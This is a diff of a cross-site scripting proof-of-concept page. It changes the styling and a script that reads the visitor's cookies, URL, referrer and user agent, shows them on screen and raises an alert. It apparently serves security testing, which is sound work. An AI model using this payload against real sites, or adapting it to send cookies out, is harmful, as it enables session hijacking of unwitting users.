@@ -3,33 +3,42 @@
 <head>
   <title>XSS PoC</title>
   <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 1em; }
-    .label { color: #0ff; }
+    body {
+      background-color: #121212;
+      color: #00ff88;
+      font-family: monospace;
+      padding: 20px;
+    }
+    h2 {
+      color: #ff4081;
+    }
+    pre {
+      background: #1e1e1e;
+      padding: 15px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+    }
   </style>
 </head>
 <body>
-<h2>XSS Payload Executed ✅</h2>
-<pre id="output"></pre>
+  <h2>🔥 XSS Executed — Details Below</h2>
+  <pre id="output">Collecting data...</pre>
 
-<script>
-  // Collect info
-  const data = {
-    cookie: document.cookie || "[HttpOnly / Empty]",
-    location: window.location.href,
-    referrer: document.referrer || "[none]",
-    userAgent: navigator.userAgent,
-    time: new Date().toISOString()
-  };
+  <script>
+    const data = {
+      "Cookie": document.cookie || "No accessible cookies (HttpOnly?)",
+      "Location": location.href,
+      "Referrer": document.referrer || "None",
+      "User Agent": navigator.userAgent,
+      "Time": new Date().toString()
+    };
 
-  // Display it on screen
-  const out = Object.entries(data).map(
-    ([key, val]) => `[${key.toUpperCase()}]: ${val}`
-  ).join('\n');
+    const output = Object.entries(data).map(([key, value]) => `${key}: ${value}`).join("\n\n");
 
-  document.getElementById('output').textContent = out;
+    document.getElementById("output").textContent = output;
 
-  // Optional alert (proof it's running)
-  alert("🔥 XSS Executed — Data Shown Below");
-</script>
+    // Optional proof-of-execution popup
+    alert("🔥 XSS Executed!");
+  </script>
 </body>
 </html>
